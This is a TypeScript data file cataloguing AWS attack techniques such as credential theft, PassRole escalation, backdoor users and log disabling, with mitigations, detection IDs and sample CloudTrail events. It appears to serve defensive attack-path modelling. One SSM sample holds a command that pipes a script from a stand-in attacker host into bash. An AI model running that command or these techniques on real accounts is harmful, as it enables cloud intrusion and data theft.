// Reusable technique nodes — the atomic building blocks of attack paths.
// Each technique represents a single attacker action that can appear in multiple attack chains.

export interface Technique {
  id: string;
  name: string;
  shortName: string;
  description: string;
  /** AWS services involved in this technique */
  services: string[];
  /** IAM permissions required to execute this technique */
  permissions: string[];
  /** Detection rule IDs that can detect this technique */
  detectionIds: string[];
  mitigations: string[];
  category: TechniqueCategory;
  /** Example CloudTrail log event for this technique */
  cloudtrailSample?: string;
  /** Attribution to sources (Hacking the Cloud, CloudGoat, etc.) */
  references?: Array<{ source: string; url?: string }>;
}

export type TechniqueCategory =
  | "initial-access"
  | "credential-access"
  | "privilege-escalation"
  | "persistence"
  | "lateral-movement"
  | "exfiltration"
  | "defense-evasion";

export const techniqueCategories: Record<TechniqueCategory, { label: string; description: string }> = {
  "initial-access": { label: "Initial Access", description: "Gaining a foothold in the cloud environment" },
  "credential-access": { label: "Credential Access", description: "Stealing or forging credentials" },
  "privilege-escalation": { label: "Privilege Escalation", description: "Gaining higher privileges" },
  "persistence": { label: "Persistence", description: "Maintaining long-term access" },
  "lateral-movement": { label: "Lateral Movement", description: "Moving across accounts and services" },
  "exfiltration": { label: "Exfiltration", description: "Stealing data from cloud resources" },
  "defense-evasion": { label: "Defense Evasion", description: "Avoiding detection" },
};

export const techniques: Technique[] = [
  {
    id: "tech-imds-credential-theft",
    name: "EC2 IMDS Credential Theft",
    shortName: "IMDS Theft",
    description:
      "Access the EC2 Instance Metadata Service (IMDS) to steal temporary IAM role credentials attached to the instance. IMDSv1 is especially vulnerable to SSRF attacks that allow remote credential extraction.",
    services: ["EC2", "IAM"],
    permissions: [],
    detectionIds: ["det-014", "det-015"],
    mitigations: [
      "Enforce IMDSv2 (require token-based access)",
      "Apply least-privilege IAM roles to EC2 instances",
      "Use VPC endpoints to restrict metadata access",
    ],
    category: "credential-access",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:i-0abc123def456",
    "arn": "arn:aws:sts::123456789012:assumed-role/EC2-WebServer-Role/i-0abc123def456",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T14:22:33Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "GetCallerIdentity",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "userAgent": "aws-cli/2.15.0 Python/3.11.6",
  "requestParameters": null,
  "responseElements": null
}`,
  },
  {
    id: "tech-passrole-abuse",
    name: "IAM PassRole Abuse",
    shortName: "PassRole",
    description:
      "Exploit iam:PassRole to pass a high-privilege IAM role to an AWS service (Lambda, EC2, Glue). The attacker then executes code through that service using the escalated role's permissions.",
    services: ["IAM", "Lambda", "EC2"],
    permissions: ["iam:PassRole"],
    detectionIds: ["det-001", "det-012"],
    mitigations: [
      "Restrict PassRole to specific role ARNs via resource conditions",
      "Implement permission boundaries on all roles",
      "Use SCPs to limit which roles can be passed",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012",
    "userName": "compromised-dev"
  },
  "eventTime": "2024-03-15T15:10:44Z",
  "eventSource": "lambda.amazonaws.com",
  "eventName": "CreateFunction20150331",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "functionName": "data-processor-v2",
    "role": "arn:aws:iam::123456789012:role/AdminRole",
    "runtime": "python3.12",
    "handler": "index.handler"
  },
  "responseElements": {
    "functionArn": "arn:aws:lambda:us-east-1:123456789012:function:data-processor-v2"
  }
}`,
  },
  {
    id: "tech-assumerole-abuse",
    name: "STS AssumeRole Abuse",
    shortName: "AssumeRole",
    description:
      "Abuse overly permissive IAM trust policies to assume roles within the same account or across accounts. This provides temporary credentials with the assumed role's permissions.",
    services: ["STS", "IAM"],
    permissions: ["sts:AssumeRole"],
    detectionIds: ["det-004"],
    mitigations: [
      "Use strict trust policy conditions (ExternalId, MFA)",
      "Limit which principals can assume sensitive roles",
      "Audit trust policies regularly",
    ],
    category: "lateral-movement",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T16:05:22Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRole",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "roleArn": "arn:aws:iam::987654321098:role/CrossAccountAdmin",
    "roleSessionName": "legit-session"
  },
  "responseElements": {
    "credentials": {
      "accessKeyId": "ASIA3XFRBF23EXAMPLE",
      "expiration": "2024-03-15T17:05:22Z"
    },
    "assumedRoleUser": {
      "arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/legit-session"
    }
  }
}`,
  },
  {
    id: "tech-create-policy-version",
    name: "Create Policy Version Escalation",
    shortName: "PolicyVersion",
    description:
      "Overwrite an existing managed IAM policy by creating a new version with elevated permissions (e.g., Action: *, Resource: *) and setting it as default.",
    services: ["IAM"],
    permissions: ["iam:CreatePolicyVersion"],
    detectionIds: ["det-011", "det-004"],
    mitigations: [
      "Restrict iam:CreatePolicyVersion to trusted administrators",
      "Use SCPs to prevent policy modification",
      "Enable AWS Config rules for policy compliance",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T17:30:11Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreatePolicyVersion",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "policyArn": "arn:aws:iam::123456789012:policy/DevTeamPolicy",
    "policyDocument": "{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Action\\":\\"*\\",\\"Resource\\":\\"*\\"}]}",
    "setAsDefault": true
  },
  "responseElements": {
    "policyVersion": { "versionId": "v3", "isDefaultVersion": true }
  }
}`,
  },
  {
    id: "tech-attach-user-policy",
    name: "IAM Policy Attachment",
    shortName: "AttachPolicy",
    description:
      "Attach a managed or inline policy directly to an IAM user or role to grant additional permissions. Commonly used for privilege escalation when iam:AttachUserPolicy or iam:PutUserPolicy is available.",
    services: ["IAM"],
    permissions: ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AttachRolePolicy"],
    detectionIds: ["det-004"],
    mitigations: [
      "Follow least-privilege principles for IAM policies",
      "Use AWS Access Analyzer to identify overly permissive policies",
      "Implement permission boundaries",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T18:12:05Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "compromised-dev",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}`,
  },
  {
    id: "tech-lambda-code-execution",
    name: "Lambda Function Code Execution",
    shortName: "Lambda Exec",
    description:
      "Create and invoke a Lambda function to execute arbitrary code in the cloud environment. Combined with PassRole, this allows code to run with the permissions of any role the attacker can pass.",
    services: ["Lambda", "IAM"],
    permissions: ["lambda:CreateFunction", "lambda:InvokeFunction"],
    detectionIds: ["det-005", "det-012"],
    mitigations: [
      "Restrict Lambda execution roles via permission boundaries",
      "Limit PassRole to specific Lambda role ARNs",
      "Audit Lambda functions and their associated roles",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T19:00:33Z",
  "eventSource": "lambda.amazonaws.com",
  "eventName": "Invoke",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "functionName": "arn:aws:lambda:us-east-1:123456789012:function:data-processor-v2",
    "invocationType": "RequestResponse"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-s3-data-download",
    name: "S3 Data Exfiltration",
    shortName: "S3 Exfil",
    description:
      "Download sensitive data from S3 buckets using compromised credentials, pre-signed URLs, or cross-account replication. High-volume GetObject calls are a key indicator.",
    services: ["S3", "IAM"],
    permissions: ["s3:GetObject", "s3:ListBucket"],
    detectionIds: ["det-003", "det-017", "det-018"],
    mitigations: [
      "Enable S3 data event logging in CloudTrail",
      "Use VPC endpoints to restrict S3 access paths",
      "Implement S3 Block Public Access at the account level",
    ],
    category: "exfiltration",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:attacker-session",
    "arn": "arn:aws:sts::123456789012:assumed-role/DataReadRole/attacker-session",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T20:45:12Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "GetObject",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "bucketName": "company-sensitive-data",
    "key": "financials/2024-Q1-report.xlsx"
  },
  "responseElements": null,
  "additionalEventData": {
    "bytesTransferredOut": 15728640
  }
}`,
  },
  {
    id: "tech-iam-user-creation",
    name: "Backdoor IAM User Creation",
    shortName: "Create User",
    description:
      "Create a new IAM user with a non-obvious name and attach administrative policies. This provides persistent access even after the original compromise vector is remediated.",
    services: ["IAM"],
    permissions: ["iam:CreateUser", "iam:PutUserPolicy"],
    detectionIds: ["det-004", "det-010"],
    mitigations: [
      "Use SCPs to restrict IAM user creation",
      "Audit IAM users regularly",
      "Implement alerting on any IAM changes",
    ],
    category: "persistence",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T21:15:44Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateUser",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "svc-cloudwatch-metrics"
  },
  "responseElements": {
    "user": {
      "userName": "svc-cloudwatch-metrics",
      "userId": "AIDA3XFRBF23BACKDOOR",
      "arn": "arn:aws:iam::123456789012:user/svc-cloudwatch-metrics"
    }
  }
}`,
  },
  {
    id: "tech-access-key-creation",
    name: "Access Key Generation",
    shortName: "Access Keys",
    description:
      "Generate long-lived IAM access keys for programmatic access. Attackers create keys on backdoor users or compromised accounts to maintain persistent re-entry.",
    services: ["IAM"],
    permissions: ["iam:CreateAccessKey"],
    detectionIds: ["det-010"],
    mitigations: [
      "Monitor access key creation events",
      "Enforce access key rotation policies",
      "Use temporary credentials (STS) instead of long-lived keys",
    ],
    category: "persistence",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T21:18:02Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "svc-cloudwatch-metrics"
  },
  "responseElements": {
    "accessKey": {
      "userName": "svc-cloudwatch-metrics",
      "accessKeyId": "AKIA3XFRBF23BACKDOOR",
      "status": "Active"
    }
  }
}`,
  },
  {
    id: "tech-lambda-event-trigger",
    name: "Lambda Persistence via Event Triggers",
    shortName: "Lambda Trigger",
    description:
      "Establish persistent access by configuring CloudWatch Events rules, S3 event notifications, or DynamoDB Streams to automatically trigger a backdoor Lambda function.",
    services: ["Lambda", "CloudTrail", "S3", "DynamoDB"],
    permissions: ["events:PutRule", "events:PutTargets", "lambda:CreateEventSourceMapping"],
    detectionIds: ["det-005", "det-013"],
    mitigations: [
      "Restrict Lambda creation to specific roles",
      "Use VPC-attached Lambda functions",
      "Audit event source mappings regularly",
    ],
    category: "persistence",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T22:05:18Z",
  "eventSource": "events.amazonaws.com",
  "eventName": "PutRule",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "name": "scheduled-health-check",
    "scheduleExpression": "rate(5 minutes)",
    "state": "ENABLED"
  },
  "responseElements": {
    "ruleArn": "arn:aws:events:us-east-1:123456789012:rule/scheduled-health-check"
  }
}`,
  },
  {
    id: "tech-cloudtrail-disable",
    name: "CloudTrail Logging Disruption",
    shortName: "Disable Logs",
    description:
      "Stop or delete CloudTrail trails to eliminate audit logging. This is a critical defense evasion technique that blinds the security team to subsequent attacker activity.",
    services: ["CloudTrail", "IAM"],
    permissions: ["cloudtrail:StopLogging", "cloudtrail:DeleteTrail"],
    detectionIds: ["det-002"],
    mitigations: [
      "Use SCPs to deny StopLogging/DeleteTrail actions",
      "Enable organization-level CloudTrail",
      "Set up real-time alerting on trail changes",
    ],
    category: "defense-evasion",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T23:00:01Z",
  "eventSource": "cloudtrail.amazonaws.com",
  "eventName": "StopLogging",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "name": "arn:aws:cloudtrail:us-east-1:123456789012:trail/management-trail"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-s3-bucket-policy-mod",
    name: "S3 Bucket Policy Modification",
    shortName: "Bucket Policy",
    description:
      "Modify or delete S3 bucket policies to grant unauthorized access, expose data publicly, or enable cross-account replication to attacker-controlled buckets.",
    services: ["S3", "IAM"],
    permissions: ["s3:PutBucketPolicy", "s3:DeleteBucketPolicy", "s3:PutBucketReplication"],
    detectionIds: ["det-017", "det-018"],
    mitigations: [
      "Enable S3 Block Public Access at account level",
      "Use SCPs to restrict bucket policy modifications",
      "Monitor bucket policy changes via CloudTrail",
    ],
    category: "exfiltration",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:attacker-session",
    "arn": "arn:aws:sts::123456789012:assumed-role/DataReadRole/attacker-session",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T23:30:55Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "PutBucketPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "bucketName": "company-sensitive-data",
    "bucketPolicy": {
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::999888777666:root"},
        "Action": "s3:*",
        "Resource": "arn:aws:s3:::company-sensitive-data/*"
      }]
    }
  }
}`,
  },
  {
    id: "tech-ecs-task-hijack",
    name: "ECS Task Definition Modification",
    shortName: "ECS Hijack",
    description:
      "Register a new ECS task definition revision with a malicious container image or modified entrypoint. When the service deploys, the attacker's code runs with the task role's permissions.",
    services: ["ECS", "IAM"],
    permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
    detectionIds: ["det-027"],
    mitigations: [
      "Restrict RegisterTaskDefinition to CI/CD pipelines only",
      "Use image signing and verification (e.g., Sigstore/Cosign)",
      "Audit task definition revisions regularly",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/DevRole/attacker"
  },
  "eventTime": "2024-04-10T09:15:22Z",
  "eventSource": "ecs.amazonaws.com",
  "eventName": "RegisterTaskDefinition",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "family": "web-app",
    "containerDefinitions": [{
      "name": "app",
      "image": "attacker-registry.io/backdoor:latest",
      "essential": true
    }],
    "taskRoleArn": "arn:aws:iam::123456789012:role/ECSTaskAdminRole"
  }
}`,
  },
  {
    id: "tech-eks-rbac-abuse",
    name: "EKS RBAC Privilege Escalation",
    shortName: "EKS RBAC",
    description:
      "Abuse Kubernetes RBAC in EKS to escalate privileges by creating ClusterRoleBindings or modifying existing roles to grant cluster-admin access to an attacker-controlled service account.",
    services: ["EKS", "IAM"],
    permissions: ["eks:AccessKubernetesApi"],
    detectionIds: ["det-025", "det-026"],
    mitigations: [
      "Use aws-auth ConfigMap with least-privilege mappings",
      "Enable EKS audit logging to CloudWatch",
      "Restrict cluster-admin bindings via OPA/Gatekeeper",
    ],
    category: "privilege-escalation",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/EKSDevRole/attacker"
  },
  "eventTime": "2024-04-10T10:30:44Z",
  "eventSource": "eks.amazonaws.com",
  "eventName": "AccessKubernetesApi",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "clusterName": "prod-cluster",
    "uri": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
    "verb": "create"
  }
}`,
  },
  {
    id: "tech-secrets-manager-theft",
    name: "Secrets Manager Secret Extraction",
    shortName: "Secrets Theft",
    description:
      "Retrieve secrets from AWS Secrets Manager using GetSecretValue. Attackers target database credentials, API keys, and tokens stored as secrets after gaining IAM access.",
    services: ["Secrets Manager", "IAM"],
    permissions: ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
    detectionIds: ["det-028"],
    mitigations: [
      "Use resource-based policies to restrict secret access",
      "Enable Secrets Manager audit logging",
      "Rotate secrets automatically on a schedule",
    ],
    category: "credential-access",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
  },
  "eventTime": "2024-04-10T11:05:33Z",
  "eventSource": "secretsmanager.amazonaws.com",
  "eventName": "GetSecretValue",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "secretId": "prod/database/admin-credentials"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-ssm-command-execution",
    name: "SSM Run Command Lateral Movement",
    shortName: "SSM RunCmd",
    description:
      "Use AWS Systems Manager Run Command to execute arbitrary commands on EC2 instances. This allows lateral movement across instances without SSH access or security group changes.",
    services: ["SSM", "EC2", "IAM"],
    permissions: ["ssm:SendCommand", "ssm:StartSession"],
    detectionIds: ["det-029"],
    mitigations: [
      "Restrict ssm:SendCommand to specific document names",
      "Use SSM Session Manager logging to S3/CloudWatch",
      "Implement approval workflows for Run Command",
    ],
    category: "lateral-movement",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
  },
  "eventTime": "2024-04-10T12:20:15Z",
  "eventSource": "ssm.amazonaws.com",
  "eventName": "SendCommand",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "documentName": "AWS-RunShellScript",
    "instanceIds": ["i-0abc123def456"],
    "parameters": {
      "commands": ["curl http://attacker.com/payload.sh | bash"]
    }
  }
}`,
  },
  {
    id: "tech-org-scp-bypass",
    name: "Organizations SCP Modification",
    shortName: "SCP Bypass",
    description:
      "Modify or detach Service Control Policies (SCPs) in AWS Organizations to remove security guardrails. This enables previously blocked actions across all accounts in the organization.",
    services: ["Organizations", "IAM"],
    permissions: ["organizations:DetachPolicy", "organizations:UpdatePolicy", "organizations:DeletePolicy"],
    detectionIds: ["det-030"],
    mitigations: [
      "Use a dedicated management account with strict MFA",
      "Alert on any SCP modifications immediately",
      "Implement break-glass procedures for SCP changes",
    ],
    category: "defense-evasion",
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::111111111111:user/mgmt-admin"
  },
  "eventTime": "2024-04-10T13:45:01Z",
  "eventSource": "organizations.amazonaws.com",
  "eventName": "DetachPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "policyId": "p-abcdef1234",
    "targetId": "ou-root-prodaccounts"
  }
}`,
  },
  // ─── Phase 1: Atlas techniques (55 additions) ───
  {
    id: "tech-trust-policy-modification",
    name: "IAM Trust Policy Modification",
    shortName: "Trust Mod",
    description: "Modify IAM role trust policies to add attacker principals (e.g., external account root) as trusted entities, enabling cross-account or backdoor access.",
    services: ["IAM"],
    permissions: ["iam:UpdateAssumeRolePolicy"],
    detectionIds: ["det-004"],
    mitigations: ["Audit trust policy changes", "Use SCPs to restrict AssumeRolePolicy modifications", "Require ExternalId for cross-account trust"],
    category: "privilege-escalation",
  },
  {
    id: "tech-inline-policy-injection",
    name: "IAM Inline Policy Injection",
    shortName: "Inline Policy",
    description: "Add inline policies to roles or users with elevated permissions, bypassing managed policy restrictions.",
    services: ["IAM"],
    permissions: ["iam:PutRolePolicy", "iam:PutUserPolicy"],
    detectionIds: [],
    mitigations: ["Restrict PutRolePolicy/PutUserPolicy", "Use permission boundaries", "Monitor inline policy changes"],
    category: "privilege-escalation",
  },
  {
    id: "tech-set-default-policy-version",
    name: "IAM Set Default Policy Version",
    shortName: "Policy Version",
    description: "Set an older, more permissive policy version as default to escalate privileges without creating a new version.",
    services: ["IAM"],
    permissions: ["iam:SetDefaultPolicyVersion"],
    detectionIds: [],
    mitigations: ["Restrict SetDefaultPolicyVersion", "Audit policy version changes", "Use AWS Config for policy compliance"],
    category: "privilege-escalation",
  },
  {
    id: "tech-delete-detach-policy",
    name: "IAM Policy Delete or Detach",
    shortName: "Policy Detach",
    description: "Delete or detach restrictive policies from roles/users to remove permission boundaries and enable escalation.",
    services: ["IAM"],
    permissions: ["iam:DeleteUserPolicy", "iam:DetachUserPolicy", "iam:DetachRolePolicy"],
    detectionIds: [],
    mitigations: ["Alert on policy detach/delete", "Use SCPs to protect critical policies", "Implement change management"],
    category: "privilege-escalation",
  },
  {
    id: "tech-delete-permissions-boundary",
    name: "IAM Permissions Boundary Deletion",
    shortName: "Boundary Delete",
    description: "Remove permissions boundaries from roles to expand their effective permissions beyond intended scope.",
    services: ["IAM"],
    permissions: ["iam:DeleteRolePermissionsBoundary", "iam:DeleteUserPermissionsBoundary"],
    detectionIds: [],
    mitigations: ["Restrict boundary deletion", "Monitor IAM boundary changes", "Use SCPs to enforce boundaries"],
    category: "privilege-escalation",
  },
  {
    id: "tech-put-permissions-boundary",
    name: "IAM Permissions Boundary Weakening",
    shortName: "Boundary Weaken",
    description: "Modify or replace permissions boundaries with weaker policies to expand role/user capabilities.",
    services: ["IAM"],
    permissions: ["iam:PutRolePermissionsBoundary", "iam:PutUserPermissionsBoundary"],
    detectionIds: [],
    mitigations: ["Restrict boundary modifications", "Audit boundary changes", "Use least-privilege boundaries"],
    category: "privilege-escalation",
  },
  {
    id: "tech-create-login-profile",
    name: "IAM Create Login Profile",
    shortName: "Login Profile",
    description: "Create a console login profile for an IAM user to enable password-based console access as a persistence mechanism.",
    services: ["IAM"],
    permissions: ["iam:CreateLoginProfile"],
    detectionIds: [],
    mitigations: ["Restrict CreateLoginProfile", "Prefer SSO over IAM user console", "Monitor login profile creation"],
    category: "privilege-escalation",
  },
  {
    id: "tech-update-login-profile",
    name: "IAM Update Login Profile",
    shortName: "Update Login",
    description: "Update an existing IAM user's login profile (e.g., set new password) to maintain or regain console access.",
    services: ["IAM"],
    permissions: ["iam:UpdateLoginProfile"],
    detectionIds: [],
    mitigations: ["Restrict UpdateLoginProfile", "Enable MFA", "Monitor login profile changes"],
    category: "privilege-escalation",
  },
  {
    id: "tech-add-user-to-group",
    name: "IAM Add User to Group",
    shortName: "Add to Group",
    description: "Add a compromised or backdoor user to a high-privilege IAM group to escalate permissions.",
    services: ["IAM"],
    permissions: ["iam:AddUserToGroup"],
    detectionIds: [],
    mitigations: ["Restrict AddUserToGroup", "Audit group membership", "Use least-privilege groups"],
    category: "privilege-escalation",
  },
  {
    id: "tech-create-backdoor-role",
    name: "IAM Backdoor Role Creation",
    shortName: "Backdoor Role",
    description: "Create a new IAM role with elevated permissions and trust policy allowing attacker access for persistence.",
    services: ["IAM"],
    permissions: ["iam:CreateRole", "iam:AttachRolePolicy"],
    detectionIds: [],
    mitigations: ["Restrict role creation", "Audit new roles", "Use SCPs to limit role creation"],
    category: "persistence",
  },
  {
    id: "tech-passrole-ec2",
    name: "PassRole via EC2 RunInstances",
    shortName: "PassRole EC2",
    description: "Exploit iam:PassRole with ec2:RunInstances to launch an EC2 instance with a high-privilege role and steal credentials via IMDS.",
    services: ["IAM", "EC2"],
    permissions: ["iam:PassRole", "ec2:RunInstances"],
    detectionIds: [],
    mitigations: ["Restrict PassRole to specific role ARNs", "Limit RunInstances to approved AMIs", "Use permission boundaries"],
    category: "privilege-escalation",
  },
  {
    id: "tech-passrole-ecs",
    name: "PassRole via ECS RunTask",
    shortName: "PassRole ECS",
    description: "Exploit iam:PassRole with ecs:RunTask to run a task with a privileged role and extract credentials from the task.",
    services: ["IAM", "ECS"],
    permissions: ["iam:PassRole", "ecs:RunTask"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for ECS", "Use task execution role separation", "Audit RunTask with custom roles"],
    category: "privilege-escalation",
  },
  {
    id: "tech-passrole-cloudformation",
    name: "PassRole via CloudFormation",
    shortName: "PassRole CFN",
    description: "Exploit iam:PassRole with cloudformation:CreateStack to deploy resources (e.g., Lambda) with a privileged role.",
    services: ["IAM", "CloudFormation"],
    permissions: ["iam:PassRole", "cloudformation:CreateStack"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for CloudFormation", "Validate stack templates", "Use change management"],
    category: "privilege-escalation",
  },
  {
    id: "tech-passrole-glue",
    name: "PassRole via Glue Dev Endpoint",
    shortName: "PassRole Glue",
    description: "Exploit iam:PassRole with glue:CreateDevEndpoint to create a dev endpoint with a privileged role and extract credentials.",
    services: ["IAM", "Glue"],
    permissions: ["iam:PassRole", "glue:CreateDevEndpoint"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Glue", "Limit dev endpoint creation", "Audit Glue dev endpoints"],
    category: "privilege-escalation",
  },
  {
    id: "tech-passrole-autoscaling",
    name: "PassRole via Auto Scaling",
    shortName: "PassRole ASG",
    description: "Exploit iam:PassRole with autoscaling:CreateLaunchConfiguration to launch instances with a privileged role.",
    services: ["IAM", "Auto Scaling"],
    permissions: ["iam:PassRole", "autoscaling:CreateLaunchConfiguration"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Auto Scaling", "Audit launch configurations", "Use least-privilege launch roles"],
    category: "privilege-escalation",
  },
  {
    id: "tech-passrole-agentcore",
    name: "Bedrock AgentCore Role Confusion",
    shortName: "AgentCore Role",
    description: "Exploit Bedrock agent role confusion to pass a privileged role to AgentCore or invoke models with elevated permissions.",
    services: ["IAM", "Bedrock"],
    permissions: ["iam:PassRole", "bedrock:CreateAgent"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Bedrock", "Audit agent configurations", "Use dedicated agent roles"],
    category: "privilege-escalation",
  },
  {
    id: "tech-glue-dev-endpoint-update",
    name: "Glue Dev Endpoint SSH Key Update",
    shortName: "Glue SSH Key",
    description: "Update a Glue dev endpoint's SSH public key to gain SSH access and extract the endpoint's IAM role credentials.",
    services: ["Glue", "IAM"],
    permissions: ["glue:UpdateDevEndpoint"],
    detectionIds: [],
    mitigations: ["Restrict UpdateDevEndpoint", "Audit dev endpoint changes", "Use VPC-restricted endpoints"],
    category: "privilege-escalation",
  },
  {
    id: "tech-get-federation-token",
    name: "STS GetFederationToken Persistence",
    shortName: "Fed Token",
    description: "Create federation tokens that survive access key deletion, providing persistent access even after key rotation.",
    services: ["STS", "IAM"],
    permissions: ["sts:GetFederationToken"],
    detectionIds: [],
    mitigations: ["Restrict GetFederationToken", "Monitor federation token creation", "Prefer AssumeRole"],
    category: "persistence",
  },
  {
    id: "tech-rogue-oidc-provider",
    name: "Rogue OIDC Identity Provider",
    shortName: "Rogue OIDC",
    description: "Create a rogue OIDC identity provider and use it in IAM trust policies to assume roles from attacker-controlled identity sources.",
    services: ["IAM"],
    permissions: ["iam:CreateOpenIDConnectProvider"],
    detectionIds: [],
    mitigations: ["Restrict CreateOpenIDConnectProvider", "Audit OIDC providers", "Use allowlists for IdP URLs"],
    category: "persistence",
  },
  {
    id: "tech-roles-anywhere-persistence",
    name: "IAM Roles Anywhere Persistence",
    shortName: "Roles Anywhere",
